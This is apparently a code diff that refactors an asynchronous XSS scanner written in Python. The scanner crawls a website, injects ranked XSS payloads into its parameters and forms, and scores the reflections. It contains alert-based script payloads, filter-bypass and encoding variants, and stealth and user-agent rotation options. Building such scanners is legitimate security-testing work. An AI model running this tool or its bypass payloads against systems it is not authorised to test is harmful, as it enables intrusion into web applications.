@@ -19,10 +19,10 @@ from rich.console import Console
 from rich.panel import Panel
 from rich.table import Table
 from rich.progress import (
-    Progress, 
-    BarColumn, 
-    TextColumn, 
-    TimeRemainingColumn, 
+    Progress,
+    BarColumn,
+    TextColumn,
+    TimeRemainingColumn,
     TimeElapsedColumn,
     TaskProgressColumn,
     MofNCompleteColumn,
@@ -71,7 +71,7 @@ class PayloadGenerator:
         """Load base payloads with priority scores (higher = more effective)"""
         return {
             XSSContext.HTML_TAG: [
-                ("<script>alert(1)</script>", 10), ("<img src=x onerror=alert(1)>", 9), 
+                ("<script>alert(1)</script>", 10), ("<img src=x onerror=alert(1)>", 9),
                 ("<svg onload=alert(1)>", 9), ("<iframe src=javascript:alert(1)>", 8),
                 ("<body onload=alert(1)>", 7), ("<object data=javascript:alert(1)>", 6),
                 ("<embed src=javascript:alert(1)>", 6), ("<video><source onerror=alert(1)>", 5),
@@ -118,16 +118,16 @@ class PayloadGenerator:
     def generate_context_payloads(self, context: XSSContext, bypass_filters: bool = True) -> List[str]:
         """Generate payloads for specific context with deduplication"""
         base_payloads = self.base_payloads.get(context, [])
-        
+
         # Sort by priority and take top payloads
         base_payloads.sort(key=lambda x: x[1], reverse=True)
         selected_payloads = [payload for payload, _ in base_payloads[:self.max_payloads_per_context//2]]
-        
+
         if not bypass_filters:
             return selected_payloads[:self.max_payloads_per_context]
 
         enhanced_payloads = set(selected_payloads)  # Use set for deduplication
-        
+
         # Add encoded variants for top payloads only
         for payload in selected_payloads[:5]:  # Only top 5 get encoding variants
             for encoding_name, encoding_func in list(self.encoding_functions.items())[:3]:  # Limit encodings
@@ -137,7 +137,7 @@ class PayloadGenerator:
                         enhanced_payloads.add(encoded)
                 except:
                     continue
-                    
+
             #add bypass variants for top payloads
             enhanced_payloads.update(self._generate_bypass_variants(payload))
 
@@ -147,7 +147,7 @@ class PayloadGenerator:
     def _generate_bypass_variants(self, payload: str) -> List[str]:
         """Generate filter bypass variants"""
         variants = []
-        
+
         # Only generate variants that are significantly different
         if 'script' in payload.lower():
             variants.extend([
@@ -156,16 +156,16 @@ class PayloadGenerator:
                 payload.upper(),
                 payload.lower()
             ])
-        
+
         if 'alert' in payload.lower():
             variants.append(payload.replace('alert', 'al/**/ert'))
-            
+
         if ' ' in payload:
             variants.extend([
                 payload.replace(' ', '\t'),
                 payload.replace(' ', '\n')
             ])
-            
+
         return variants[:4]  # Limit bypass variants
 
 # ==================== Context Analysis ====================
@@ -196,32 +196,32 @@ class HTMLContextParser:
         contexts.extend(self._check_css(soup, payload))
         contexts.extend(self._check_json(html_content, payload))
         contexts.extend(self._check_comments(html_content, payload))
-        
+
         # Sort by priority and confidence, return only the best match
         if contexts:
             contexts.sort(key=lambda x: (self.context_priority.get(x[0], 0), x[2]), reverse=True)
-            return [contexts[0]]  # Return only the highest priority context
+            return [contexts[0]]  #return only the highest priority context
         return []
 
     def _check_html_tags(self, soup: BeautifulSoup, payload: str) -> List[Tuple[XSSContext, str, float]]:
         contexts = []
-        confidence = 0.7  # Base confidence
         
         for node in soup.find_all(text=True):
             if payload in str(node):
                 parent = node.parent.name if node.parent else 'text'
-                # Higher confidence if in potentially executable contexts
                 if parent in ['script', 'style']:
                     confidence = 0.9
                 elif parent in ['title', 'textarea']:
-                    confidence = 0.8
+                    confidence = 0.4
+                else:
+                    confidence = 0.2
                 contexts.append((XSSContext.HTML_TAG, f"Found in <{parent}> tag", confidence))
         return contexts
 
     def _check_attributes(self, soup: BeautifulSoup, payload: str) -> List[Tuple[XSSContext, str, float]]:
         contexts = []
         dangerous_attrs = ['src', 'href', 'action', 'formaction', 'data']
-        
+
         for tag in soup.find_all(True):
             for attr, value in tag.attrs.items():
                 if isinstance(value, str) and payload in value:
@@ -243,7 +243,7 @@ class HTMLContextParser:
         contexts = []
         event_attrs = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur',
                        'onchange', 'onsubmit', 'onkeyup', 'onkeydown', 'onmouseenter', 'onmouseleave']
-        
+
         for tag in soup.find_all(True):
             for event in event_attrs:
                 if tag.has_attr(event) and payload in tag[event]:
@@ -260,7 +260,7 @@ class HTMLContextParser:
             if payload in tag['style']:
                 contexts.append((XSSContext.CSS, f"Found in {tag.name}[style]", 0.7))
         return contexts
-        
+
     def _check_json(self, html_content: str, payload: str) -> List[Tuple[XSSContext, str, float]]:
         json_pattern = re.compile(r'\{[^{}]*\}|\[[^\[\]]*\]')
         for match in json_pattern.finditer(html_content):
@@ -291,7 +291,7 @@ class PerDomainRateLimiter:
         """Acquire rate limit for specific domain"""
         semaphore = self.domain_limiters[domain]
         min_interval = self.min_intervals[domain]
-        
+
         async with semaphore:
             if min_interval > 0:
                 now = time.time()
@@ -306,15 +306,16 @@ class XSSScanner:
     def __init__(self, target_url: str, config: Optional[Dict] = None):
         self.target_url = target_url
         self.config = self._default_config()
-        if config: 
+        if config:
             self.config.update(config)
-        
+
         self.parser = HTMLContextParser()
         self.payload_generator = PayloadGenerator(self.config.get('max_payloads_per_context', 15))
         self.header_factory = HeaderFactory()
         self.vulnerabilities: List[XSSVulnerability] = []
         self.rate_limiter = PerDomainRateLimiter(self.config['rate_limit'])
-        
+        self.cancelled = False
+
         # Setup logging
         if self.config.get('verbose'):
             logging.basicConfig(level=logging.INFO)
@@ -324,15 +325,28 @@ class XSSScanner:
             'max_depth': 3, 'max_pages': 100, 'timeout': 10, 'threads': 20,
             'rate_limit': 10, 'follow_redirects': True, 'test_cookies': True,
             'test_headers': True, 'test_json': True, 'stealth_mode': False,
-            'proxy': None, 'user_agent_rotation': True, 'verbose': True, 
+            'proxy': None, 'user_agent_rotation': True, 'verbose': True,
             'smart_mode': True, 'max_payloads_per_context': 15,
-            'batch_size': 100, 'max_retries': 3, 'retry_delay': 1.0
+            'batch_size': 50, 'max_retries': 3, 'retry_delay': 1.0
         }
 
     async def scan(self) -> List[XSSVulnerability]:
-        """Main scanning method with improved error handling"""
-        console.print(Panel.fit(f"\n[bold cyan]Starting XSS Scan[/bold cyan]\nTarget: {self.target_url}\n", title="XSS Scanner"))
-        
+        config_table = Table.grid(padding=(0, 2), expand=True)
+        config_table.add_column(style="bold cyan", justify="right")
+        config_table.add_column()
+        config_table.add_row("Target URL:", self.target_url)
+        config_table.add_row("Threads:", str(self.config['threads']))
+        config_table.add_row("Rate Limit:", f"{self.config['rate_limit']} req/s")
+        config_table.add_row("Smart Mode:", "Enabled" if self.config['smart_mode'] else "Disabled")
+        config_table.add_row("Stealth Mode:", "Enabled" if self.config['stealth_mode'] else "Disabled")
+        config_table.add_row("Batch Size:", str(self.config['batch_size']))
+
+        console.print(Panel(
+            config_table,
+            title="[bold cyan]XSS Scanner Configuration[/bold cyan]",
+            border_style="green"
+        ))
+
         progress_columns = [
             TextColumn("[progress.description]{task.description}"),
             BarColumn(),
@@ -341,101 +355,158 @@ class XSSScanner:
             TimeElapsedColumn(),
             TimeRemainingColumn(),
         ]
-        
-        try:
-            with Progress(*progress_columns, console=console) as progress:
-                # Task for endpoint discovery
-                task_discover = progress.add_task("[cyan]Discovering endpoints...", total=1)
-                endpoints = await self._discover_endpoints(progress, task_discover)
-                progress.update(task_discover, completed=1)
-                
-                # Task for injection point analysis
-                task_analyze = progress.add_task("[green]Analyzing injection points...", total=1)
-                injection_points = await self._analyze_injection_points(endpoints)
-                progress.update(task_analyze, completed=1)
-                
-                # Task for payload testing
-                total_payloads = sum(
-                    len(self.payload_generator.generate_context_payloads(ctx))
-                    for point in injection_points
-                    for ctx in XSSContext
-                )
-                task_test = progress.add_task("[red]Testing payloads...", total=total_payloads)
-                
-                await self._test_payloads_batched(injection_points, progress, task_test)
-                
-                # Task for verification
-                task_verify = progress.add_task("[yellow]Verifying vulnerabilities...", total=1)
-                self._verify_vulnerabilities()
-                progress.update(task_verify, completed=1)
-            return self.vulnerabilities
-        except Exception as e:
-            logger.error(f"Scan failed: {e}")
-            raise
 
-    async def _test_payloads_batched(self, injection_points: List[Dict], 
+        try:
+            async with aiohttp.ClientSession(
+                timeout=aiohttp.ClientTimeout(total=self.config['timeout']),
+                connector=aiohttp.TCPConnector(limit=self.config['threads'])
+            ) as session:
+                with Progress(*progress_columns, console=console) as progress:
+                    task_discover = progress.add_task("[cyan]Discovering endpoints...", total=None)
+                    endpoints = await self._discover_endpoints(session, progress, task_discover)
+                    progress.update(task_discover, total=1, completed=1, description="[green]Discovered endpoints")
+
+                    if self.cancelled: return self.vulnerabilities
+
+                    injection_points = self._analyze_injection_points(endpoints)
+                    progress.add_task("[green]Analyzing injection points...", total=len(injection_points), completed=len(injection_points))
+
+                    if self.cancelled: return self.vulnerabilities
+
+                    contextual_points = injection_points
+                    if self.config['smart_mode']:
+                        task_context = progress.add_task("[blue]Determining contexts...", total=len(injection_points))
+                        contextual_points = await self._determine_contexts(session, injection_points, progress, task_context)
+
+                    if self.cancelled: return self.vulnerabilities
+
+                    task_test = progress.add_task("[red]Testing payloads...", total=None)
+                    await self._test_payloads_batched(session, contextual_points, progress, task_test)
+
+                    if self.cancelled: return self.vulnerabilities
+
+                    task_verify = progress.add_task("[yellow]Verifying vulnerabilities...", total=1)
+                    self._verify_vulnerabilities()
+                    progress.update(task_verify, completed=1)
+
+            return self.vulnerabilities
+        except (Exception, asyncio.CancelledError) as e:
+            if isinstance(e, (asyncio.CancelledError, KeyboardInterrupt)):
+                self.cancelled = True
+                logger.warning("Scan cancelled by user.")
+            else:
+                logger.error(f"Scan failed: {e}", exc_info=True)
+            return self.vulnerabilities
+
+    async def _determine_contexts(self, session: aiohttp.ClientSession, injection_points: List[Dict], progress: Progress, task_id: TaskID) -> List[Dict]:
+        contextual_points = []
+        semaphore = asyncio.Semaphore(self.config['threads'])
+
+        async def get_context(point):
+            async with semaphore:
+                if self.cancelled: return
+
+                probe = f"dKryptPr0b3{random.randint(1000, 9999)}"
+                endpoint, param = point['endpoint'], point['parameter']
+                method = endpoint.get('method', 'GET')
+                url = endpoint['url']
+
+                params, data = None, None
+                if method == 'GET':
+                    params = {param: probe}
+                else:
+                    if endpoint.get('type') == 'form':
+                        data = {p: v.get('value', '') for p, v in endpoint['params'].items()}
+                        data[param] = probe
+                    else:
+                        data = {param: probe}
+
+                try:
+                    domain = urlparse(url).netloc
+                    await self.rate_limiter.acquire(domain)
+
+                    async with session.request(method, url, params=params, data=data, headers=self.header_factory.get_headers(), allow_redirects=self.config['follow_redirects']) as response:
+                        if response.status < 400:
+                            content = await response.text()
+                            if probe in content:
+                                contexts_found = self.parser.analyze_context(content, probe)
+                                if contexts_found:
+                                    point['contexts'] = [c[0] for c in contexts_found]
+                                    contextual_points.append(point)
+                except Exception as e:
+                    logger.debug(f"Context analysis failed for {param} at {url}: {e}")
+                finally:
+                    progress.update(task_id, advance=1)
+
+        tasks = [get_context(point) for point in injection_points]
+        await asyncio.gather(*tasks)
+
+        progress.update(task_id, description=f"[green]Analyzed {len(contextual_points)} contextual points")
+        return contextual_points
+
+    async def _test_payloads_batched(self, session: aiohttp.ClientSession, injection_points: List[Dict],
                                 progress: Progress, task_id: TaskID):
         semaphore = asyncio.Semaphore(self.config['threads'])
-        batch_size = self.config['batch_size']
-        
-        async def test_task_generator():
-            for point in injection_points:
-                sorted_contexts = sorted(
-                    XSSContext, 
-                    key=lambda ctx: self.payload_generator.context_priority.get(ctx, 0), 
-                    reverse=True
-                )
-                for ctx in sorted_contexts:
-                    payloads = self.payload_generator.generate_context_payloads(ctx)
-                    for payload in payloads:
-                        yield self._test_single_payload_with_retry(
-                            session, point, payload, ctx, semaphore, progress, task_id
-                        )
 
-        async with aiohttp.ClientSession(
-            timeout=aiohttp.ClientTimeout(total=self.config['timeout']),
-            connector=aiohttp.TCPConnector(limit=self.config['threads'])
-        ) as session:
-            batch = []
-            async for task_coro in test_task_generator():
-                batch.append(asyncio.create_task(task_coro))
-                if len(batch) >= batch_size:
-                    results = await asyncio.gather(*batch, return_exceptions=True)
-                    progress.update(task_id, advance=len(batch))
-                    self._process_results(results)
-                    batch.clear()
-            
-            if batch:
-                results = await asyncio.gather(*batch, return_exceptions=True)
-                progress.update(task_id, advance=len(batch))
-                self._process_results(results)
+        tests_to_run = []
+        for point in injection_points:
+            contexts_to_test = point.get('contexts')
+            if not self.config['smart_mode'] or not contexts_to_test:
+                contexts_to_test = [XSSContext.HTML_TAG, XSSContext.HTML_ATTRIBUTE, XSSContext.JAVASCRIPT]
+
+            for ctx in contexts_to_test:
+                payloads = self.payload_generator.generate_context_payloads(ctx)
+                for payload in payloads:
+                    tests_to_run.append((point, payload, ctx))
+
+        progress.update(task_id, total=len(tests_to_run))
+
+        tasks = [
+            asyncio.create_task(self._test_single_payload_with_retry(session, point, payload, ctx, semaphore))
+            for point, payload, ctx in tests_to_run
+        ]
+
+        batch_size = self.config['batch_size']
+        for i in range(0, len(tasks), batch_size):
+            if self.cancelled:
+                for task in tasks[i:]: task.cancel()
+                break
+
+            batch = tasks[i:i+batch_size]
+            results = await asyncio.gather(*batch, return_exceptions=True)
+            self._process_results(results)
+            progress.update(task_id, advance=len(batch))
 
     def _process_results(self, results):
         """Process batch results and collect vulnerabilities"""
         for result in results:
             if isinstance(result, XSSVulnerability):
                 self.vulnerabilities.append(result)
+            elif isinstance(result, (asyncio.CancelledError, KeyboardInterrupt)):
+                self.cancelled = True
             elif isinstance(result, Exception) and not isinstance(result, (asyncio.TimeoutError, aiohttp.ClientError)):
                 logger.warning(f"Unexpected error in batch: {result}")
 
-    async def _test_single_payload_with_retry(self, session: aiohttp.ClientSession, point: Dict, 
-                                            payload: str, context: XSSContext, semaphore: asyncio.Semaphore,
-                                            progress: Progress, task_id: TaskID) -> Optional[XSSVulnerability]:
+    async def _test_single_payload_with_retry(self, session: aiohttp.ClientSession, point: Dict,
+                                            payload: str, context: XSSContext, semaphore: asyncio.Semaphore) -> Optional[XSSVulnerability]:
         """Test single payload with retry logic and rate limiting"""
         async with semaphore:
+            if self.cancelled: return None
+
             domain = urlparse(point['endpoint']['url']).netloc
             await self.rate_limiter.acquire(domain)
-            
+
             for attempt in range(self.config['max_retries']):
+                if self.cancelled: return None
                 try:
-                    result = await self._test_single_payload(session, point, payload, context)
-                    progress.update(task_id, advance=1)
-                    return result
+                    return await self._test_single_payload(session, point, payload, context)
+                except asyncio.CancelledError:
+                    raise
                 except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                     if attempt < self.config['max_retries'] - 1:
-                        delay = self.config['retry_delay'] * (2 ** attempt)  # Exponential backoff
+                        delay = self.config['retry_delay'] * (2 ** attempt)
                         await asyncio.sleep(delay)
-                        logger.info(f"Retrying request after {delay}s (attempt {attempt + 2})")
+                        logger.info(f"Retrying request after {delay:.1f}s (attempt {attempt + 2})")
                     else:
                         logger.debug(f"Max retries exceeded for {point['parameter']}: {e}")
                 except Exception as e:
@@ -443,92 +514,102 @@ class XSSScanner:
                     break
             return None
 
-    async def _test_single_payload(self, session: aiohttp.ClientSession, point: Dict, 
+    async def _test_single_payload(self, session: aiohttp.ClientSession, point: Dict,
                                  payload: str, context: XSSContext) -> Optional[XSSVulnerability]:
         """Core payload testing logic"""
         endpoint, param = point['endpoint'], point['parameter']
         method = endpoint.get('method', 'GET')
-        params, data = ({param: payload}, None) if method == 'GET' else (None, {param: payload})
         url = endpoint['url']
-        
+
+        params, data = None, None
+        if method == 'GET':
+            params = {param: payload}
+        else:
+            if endpoint.get('type') == 'form':
+                data = {p: v.get('value', '') for p, v in endpoint['params'].items()}
+            else:
+                data = {}
+            data[param] = payload
+
         start_time = time.time()
         async with session.request(
-            method, url, params=params, data=data, 
+            method, url, params=params, data=data,
             headers=self.header_factory.get_headers(),
             allow_redirects=self.config['follow_redirects']
         ) as response:
-            
+
             content_type = response.headers.get('Content-Type', '').lower()
             if not any(t in content_type for t in ['text', 'html', 'json', 'xml']):
                 return None
 
             content = await response.text()
             if self._is_payload_reflected(content, payload):
+                if not self._is_payload_executable(content, payload):
+                    return None
+
                 contexts = self.parser.analyze_context(content, payload)
                 if contexts:
                     context_info, description, confidence = contexts[0]
-                    
+
                     vuln = XSSVulnerability(
                         url=str(response.url), method=method, parameter=param, payload=payload,
                         context=context_info, severity=self._calculate_severity(context_info, confidence),
-                        evidence=self._extract_evidence(content, payload), 
+                        evidence=self._extract_evidence(content, payload),
                         response_time=time.time() - start_time,
                         status_code=response.status, headers=dict(response.headers),
                         request_data={'param': param, 'payload': payload}
                     )
+                    vuln.description = description
                     vuln.cvss_score = self._calculate_cvss(vuln, confidence)
                     vuln.remediation = self._generate_remediation(vuln)
                     return vuln
         return None
 
-    async def _discover_endpoints(self, progress: Progress, task_id: TaskID) -> List[Dict]:
+    async def _discover_endpoints(self, session: aiohttp.ClientSession, progress: Progress, task_id: TaskID) -> List[Dict]:
         """Endpoint discovery with session management"""
         endpoints = []
-        async with aiohttp.ClientSession(
-            timeout=aiohttp.ClientTimeout(total=self.config['timeout'])
-        ) as session:
-            crawled_data = await self._crawl_website(session, self.target_url, progress, task_id)
-            for url, data in crawled_data.items():
-                if data.get('params'):
-                    endpoints.append({
-                        'url': url, 'method': 'GET', 'params': data['params'], 'type': 'query'
-                    })
-                for form in data.get('forms', []):
-                    endpoints.append({
-                        'url': form['action'], 'method': form['method'].upper(), 
-                        'params': form['inputs'], 'type': 'form'
-                    })
-                for ajax_url in data.get('ajax_endpoints', []):
-                    endpoints.append({
-                        'url': ajax_url, 'method': 'POST', 'params': {}, 'type': 'ajax'
-                    })
+        crawled_data = await self._crawl_website(session, self.target_url, progress, task_id)
+        for url, data in crawled_data.items():
+            if data.get('params'):
+                endpoints.append({
+                    'url': url, 'method': 'GET', 'params': data['params'], 'type': 'query'
+                })
+            for form in data.get('forms', []):
+                endpoints.append({
+                    'url': form['action'], 'method': form['method'].upper(),
+                    'params': form['inputs'], 'type': 'form'
+                })
+            for ajax_url in data.get('ajax_endpoints', []):
+                endpoints.append({
+                    'url': ajax_url, 'method': 'POST', 'params': {}, 'type': 'ajax'
+                })
         console.print(f"[green]Discovered {len(endpoints)} endpoints[/green]")
         return endpoints
 
-    async def _crawl_website(self, session: aiohttp.ClientSession, start_url: str, 
+    async def _crawl_website(self, session: aiohttp.ClientSession, start_url: str,
                             progress: Progress, task_id: TaskID, depth: int = 0) -> Dict:
         crawled_data, to_visit, visited = {}, {start_url}, set()
-        total_urls = min(len(to_visit), self.config['max_pages'])
-        progress.update(task_id, total=total_urls)
-        
-        while to_visit and len(visited) < self.config['max_pages']:
+
+        while to_visit and len(visited) < self.config['max_pages'] and not self.cancelled:
             url = to_visit.pop()
-            if url in visited: 
+            if url in visited or urlparse(url).netloc != urlparse(start_url).netloc:
                 continue
             visited.add(url)
-            
+
+            progress.update(task_id, description=f"[cyan]Crawling {url[:70]}...")
+
             try:
                 domain = urlparse(url).netloc
                 await self.rate_limiter.acquire(domain)
-                
+
                 async with session.get(url, headers=self.header_factory.get_headers()) as response:
-                    if response.status != 200: 
+                    if response.status != 200:
                         continue
-                    
+
                     content_type = response.headers.get('Content-Type', '').lower()
-                    if not any(t in content_type for t in ['text', 'html', 'json', 'xml']):
+                    if 'html' not in content_type:
                         continue
-                    
+
                     content = await response.text()
                     soup = BeautifulSoup(content, 'html.parser')
                     crawled_data[url] = {
@@ -536,18 +617,15 @@ class XSSScanner:
                         'forms': self._extract_forms(soup, url),
                         'ajax_endpoints': self._extract_ajax_endpoints(content),
                     }
-                    
+
                     # Add new links
                     for link in soup.find_all('a', href=True):
-                        absolute_url = urljoin(url, link['href'])
-                        if urlparse(absolute_url).netloc == urlparse(start_url).netloc:
-                            to_visit.add(absolute_url)
-                    
-                    progress.update(task_id, advance=1, description=f"[cyan]Crawling... ({len(visited)}/{total_urls})")        
-                            
+                        if len(to_visit) + len(visited) < self.config['max_pages'] * 1.5:
+                            to_visit.add(urljoin(url, link['href']))
+
             except Exception as e:
                 logger.debug(f"Error crawling {url}: {e}")
-                
+
         return crawled_data
 
     def _extract_url_params(self, url: str) -> List[str]:
@@ -572,7 +650,7 @@ class XSSScanner:
 
     def _extract_ajax_endpoints(self, content: str) -> List[str]:
         patterns = [
-            r'fetch\([\'"]([^\'"]+)[\'"]\)', 
+            r'fetch\([\'"]([^\'"]+)[\'"]\)',
             r'\.ajax\({[^}]*url:\s*[\'"]([^\'"]+)[\'"]'
         ]
         endpoints = []
@@ -580,8 +658,8 @@ class XSSScanner:
             endpoints.extend(re.findall(pattern, content, re.I))
         return list(set(endpoints))
 
-    async def _analyze_injection_points(self, endpoints: List[Dict]) -> List[Dict]:
-        """Enhanced injection point analysis with better prioritization"""
+    def _analyze_injection_points(self, endpoints: List[Dict]) -> List[Dict]:
+        """Handle injection point analysis with prioritization system"""
         injection_points = []
         for endpoint in endpoints:
             for param_name in endpoint.get('params', {}):
@@ -591,29 +669,29 @@ class XSSScanner:
                     'parameter': param_name,
                     'priority': priority
                 })
-              
+
         if self.config['smart_mode']:
             injection_points.sort(key=lambda x: x['priority'], reverse=True)
             # Limit to top injection points to improve efficiency
             max_points = self.config.get('max_injection_points', 200)
             injection_points = injection_points[:max_points]
-            
+
         return injection_points
 
     def _calculate_priority(self, param_name: str, endpoint: Dict) -> int:
         """priority calculation"""
         priority = 0
-        
+
         # Parameter name analysis
-        high_priority = ['q', 'search', 'query', 'keyword', 'term', 'data', 'input', 'content']
-        medium_priority = ['name', 'title', 'comment', 'message', 'text', 'value']
-        
+        high_priority = ['q', 'search', 'query', 'keyword', 'term', 'data', 'input', 'content', 'url', 'redirect']
+        medium_priority = ['name', 'title', 'comment', 'message', 'text', 'value', 'page', 'id']
+
         param_lower = param_name.lower()
         if any(hp in param_lower for hp in high_priority):
             priority += 15
         elif any(mp in param_lower for mp in medium_priority):
             priority += 10
-        
+
         # Endpoint type analysis
         if endpoint.get('type') == 'query':
             priority += 5
@@ -623,36 +701,65 @@ class XSSScanner:
             priority += 12
         elif endpoint.get('type') == 'form':
             priority += 10
-            
+
         return priority
 
     def _is_payload_reflected(self, content: str, payload: str) -> bool:
         """reflection detection"""
+        #use a simplified version of the payload for reflection check to handle encoding
+        simple_payload = re.sub(r'[^a-zA-Z0-9]', '', payload)[:10]
+        if not simple_payload: return payload in content
+
         checks = [
             payload in content,
             html.escape(payload) in content,
             urllib.parse.quote(payload) in content,
-            base64.b64encode(payload.encode()).decode() in content
+            simple_payload in html.escape(content),
         ]
         return any(checks)
+
+    # NEW: Stricter execution verification method
+    def _is_payload_executable(self, content: str, payload: str) -> bool:
+        """Check if payload is likely to execute instead of just reflecting"""
+        # This check is based on the user's request to verify execution context.
+        # We look for the core part of our payloads ("dKryptXSS" probe equivalent) in contexts where it could run.
+        probe = "alert(1)"
+
+        # 1. Direct script tag execution check (e.g., <script>alert(1)</script>)
+        if re.search(r"<script[^>]*>.*" + re.escape(probe), content, re.I | re.S):
+            return True
+        
+        # 2. Event handler check (e.g., onerror="alert(1)")
+        if re.search(r"on\w+\s*=\s*[\"'].*" + re.escape(probe) + r".*[\"']", content, re.I):
+            return True
+            
+        # 3. Inline JS context, for when the probe is inside a JS string
+        # This is a weaker indicator but follows the user's requested logic pattern.
+        if re.search(r"['\"]" + re.escape(probe) + r"['\"]", content):
+            return True
+
+        return False
 
     def _extract_evidence(self, content: str, payload: str) -> str:
         """evidence extraction"""
         # Try different payload variations
         variations = [payload, html.escape(payload), urllib.parse.quote(payload)]
-        
+
         for variation in variations:
-            index = content.find(variation)
-            if index != -1:
+            try:
+                index = content.index(variation)
                 start = max(0, index - 100)
                 end = min(len(content), index + len(variation) + 100)
                 evidence = content[start:end]
-                return evidence.replace(variation, f"[[[{variation}]]]")
-        
+                # Use rich-style highlighting
+                return evidence.replace(variation, f"[bold red]{variation}[/bold red]")
+            except ValueError:
+                continue
+
         return "Payload reflected but exact location unclear"
 
     def _calculate_severity(self, context: XSSContext, confidence: float) -> VulnerabilitySeverity:
-        """Enhanced severity calculation with confidence weighting"""
+        """severity calculation with confidence system and weighting"""
         base_severity_map = {
             XSSContext.JAVASCRIPT: VulnerabilitySeverity.CRITICAL,
             XSSContext.EVENT_HANDLER: VulnerabilitySeverity.HIGH,
@@ -664,9 +771,9 @@ class XSSScanner:
             XSSContext.COMMENT: VulnerabilitySeverity.LOW,
             XSSContext.CDATA: VulnerabilitySeverity.LOW,
         }
-        
+
         base_severity = base_severity_map.get(context, VulnerabilitySeverity.LOW)
-        
+
         # Adjust severity based on confidence
         if confidence < 0.5:
             # Downgrade severity for low confidence
@@ -677,11 +784,11 @@ class XSSScanner:
                 VulnerabilitySeverity.LOW: VulnerabilitySeverity.INFO,
             }
             return severity_downgrade.get(base_severity, VulnerabilitySeverity.INFO)
-        
+
         return base_severity
 
     def _calculate_cvss(self, vuln: XSSVulnerability, confidence: float = 1.0) -> float:
-        """Enhanced CVSS calculation with confidence weighting"""
+        """CVSS calculation with confidence weighting"""
         base_scores = {
             VulnerabilitySeverity.CRITICAL: 9.5,
             VulnerabilitySeverity.HIGH: 7.8,
@@ -689,18 +796,18 @@ class XSSScanner:
             VulnerabilitySeverity.LOW: 3.2,
             VulnerabilitySeverity.INFO: 0.5
         }
-        
+
         score = base_scores.get(vuln.severity, 3.1)
-        
+
         #context-based adjustments
         if vuln.context in [XSSContext.JAVASCRIPT, XSSContext.EVENT_HANDLER]:
             score = min(10.0, score + 0.8)
         elif vuln.context == XSSContext.HTML_TAG:
             score = min(10.0, score + 0.5)
-        
+
         # Confidence-based adjustment
         score *= confidence
-        
+
         return round(score, 1)
 
     def _generate_remediation(self, vuln: XSSVulnerability) -> str:
@@ -715,51 +822,58 @@ class XSSScanner:
             XSSContext.JSON: "1. Properly escape JSON data. 2. Use safe JSON serialization. 3. Validate JSON structure.",
             XSSContext.COMMENT: "1. Remove or encode comments containing user data. 2. Use secure templating.",
         }
-        
+
         base_remediation = remediations.get(vuln.context, "Implement proper input validation and output encoding.")
         return f"{base_remediation} 4. Regular security testing and code review."
 
-    # vulnerabi;ity verification
+    # final verification
     def _verify_vulnerabilities(self):
         verified = []
         for vuln in self.vulnerabilities:
+            if vuln.context == XSSContext.HTML_TAG and hasattr(vuln, 'description'):
+                match = re.search(r"Found in <([\w\-]+)> tag", vuln.description)
+                if match:
+                    parent_tag = match.group(1).lower()
+                    if parent_tag not in ['script', 'style']:
+                        continue 
+
             false_positive_score = self._calculate_false_positive_score(vuln)
-            if false_positive_score < 0.6:  # Slightly higher threshold
+            if false_positive_score < 0.6:
                 vuln.false_positive_score = false_positive_score
                 verified.append(vuln)
-        
+
         console.print(f"[green]Verified {len(verified)} of {len(self.vulnerabilities)} potential vulnerabilities[/green]")
         self.vulnerabilities = verified
 
     def _calculate_false_positive_score(self, vuln: XSSVulnerability) -> float:
         score = 0.0
-        
+
         # URL-based indicators
         error_indicators = ['error', 'debug', 'test', '404', '500']
         if any(indicator in vuln.url.lower() for indicator in error_indicators):
             score += 0.25
-        
+
         # Response time indicators (very fast responses might be cached/static)
         if vuln.response_time < 0.05:
             score += 0.15
         elif vuln.response_time > 5.0:
             score += 0.1
-        
+
         # Evidence quality
-        if vuln.payload not in vuln.evidence:
+        if "[bold red]" not in vuln.evidence: # Check if payload was highlighted
             score += 0.4
         elif len(vuln.evidence.strip()) < 50:
             score += 0.2
-        
+
         # Context-based scoring
         low_impact_contexts = [XSSContext.COMMENT, XSSContext.CDATA]
         if vuln.context in low_impact_contexts:
             score += 0.3
-        
+
         # Status code indicators
         if vuln.status_code >= 400:
             score += 0.2
-        
+
         return min(1.0, score)
 
 # ==================== Main Entry Point ====================
@@ -767,10 +881,10 @@ class XSSScanner:
 async def run_xss_scan(url, threads, rate_limit, max_payloads, batch_size, smart_mode, stealth_mode, test_headers, verbose):
     clear_console()
     header_banner(tool_name="XSS Scanner")
-    
+
     if not url.startswith(('http://', 'https://')):
         url = 'https://' + url
-    
+
     config = {
         'threads': threads,
         'rate_limit': rate_limit,
@@ -781,58 +895,54 @@ async def run_xss_scan(url, threads, rate_limit, max_payloads, batch_size, smart
         'test_headers': test_headers,
         'verbose': verbose
     }
-    
-    # Initialize scanner
+
     scanner = XSSScanner(url, config)
-    
+
     try:
         vulnerabilities = await scanner.scan()
-        
-        #display results
+
+        if scanner.cancelled:
+            console.print("\n[yellow]Scan cancelled by user. Displaying results found so far.[/yellow]")
+
         if vulnerabilities:
             console.print(f"\n[bold red]Found {len(vulnerabilities)} XSS vulnerabilities![/bold red]\n")
-            
-            # Create summary table
-            table = Table(title="XSS Vulnerabilities Summary", show_header=True, header_style="bold magenta")
-            table.add_column("Parameter", style="cyan")
+
+            table = Table(title="XSS Vulnerabilities Summary", show_header=True, header_style="bold magenta", expand=True)
+            table.add_column("Parameter", style="cyan", max_width=20)
             table.add_column("Context", style="yellow")
             table.add_column("Severity", style="red")
             table.add_column("CVSS", style="green")
             table.add_column("Confidence", style="blue")
             table.add_column("URL", style="blue", overflow="fold")
-            
+
             for vuln in sorted(vulnerabilities, key=lambda x: x.cvss_score, reverse=True)[:15]:
                 severity_color = {
-                    'critical': 'bold red',
-                    'high': 'red',
-                    'medium': 'yellow',
-                    'low': 'blue',
-                    'info': 'dim'
+                    'critical': 'bold red', 'high': 'red', 'medium': 'yellow',
+                    'low': 'blue', 'info': 'dim'
                 }.get(vuln.severity.value[2], 'white')
-                
+
                 confidence = f"{(1.0 - vuln.false_positive_score) * 100:.0f}%"
-                
+
                 table.add_row(
                     vuln.parameter,
                     vuln.context.value,
                     f"[{severity_color}]{vuln.severity.value[2].upper()}[/{severity_color}]",
                     str(vuln.cvss_score),
                     confidence,
-                    vuln.url[:40] + "..." if len(vuln.url) > 40 else vuln.url
+                    html.escape(vuln.url)
                 )
-            
+
             console.print(table)
-            
-            # Generate reports
+
